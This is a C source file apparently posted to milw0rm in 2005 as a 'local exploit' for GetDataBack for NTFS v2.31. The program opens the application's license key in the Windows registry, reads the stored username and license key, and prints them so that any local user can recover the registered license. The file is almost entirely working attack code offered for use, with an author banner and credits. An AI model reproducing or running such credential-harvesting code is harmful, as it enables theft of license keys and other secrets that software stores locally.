/*****************************************************************

GetDataBack for NTFS v2.31 Local Exploit by Kozan

Application: GetDataBack for NTFS v2.31
Vendor: www.runtime.org - Runtime Software
Vulnerable Description: GetDataBack for NTFS v2.31 discloses licence
informaations ( username and key ) to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include <stdio.h>
#include <windows.h>

#define BUFSIZE 100
HKEY hKey;
char username[BUFSIZE], key[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main(void)
{

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Runtime
Software\\GetDataBackNT\\License",
0,
KEY_QUERY_VALUE,
&hKey) == ERROR_SUCCESS)
{

lRet = RegQueryValueEx( hKey, "Name", NULL, NULL,(LPBYTE) username,
&dwBufLen);

if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
RegCloseKey(hKey);
printf("An error occured!");
return 0;
}

lRet = RegQueryValueEx( hKey, "Key", NULL, NULL,(LPBYTE) key, &dwBufLen);

if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
RegCloseKey(hKey);
printf("An error occured!");
return 0;
}
RegCloseKey( hKey );

printf("GetDataBack for NTFS v2.31 Local Exploit by Kozan\n");
printf("Credits to ATmaCA\n");
printf("www.netmagister.com - www.spyinstructors.com\n");
printf("kozan@netmagister.com\n\n");
printf("Username: %s\n",username);
printf("Key : %s\n",key);

}
else{
printf("GetDataBack for NTFS v2.31 is not installed on your system!\n");
}

return 0;
}

// milw0rm.com [2005-04-04]
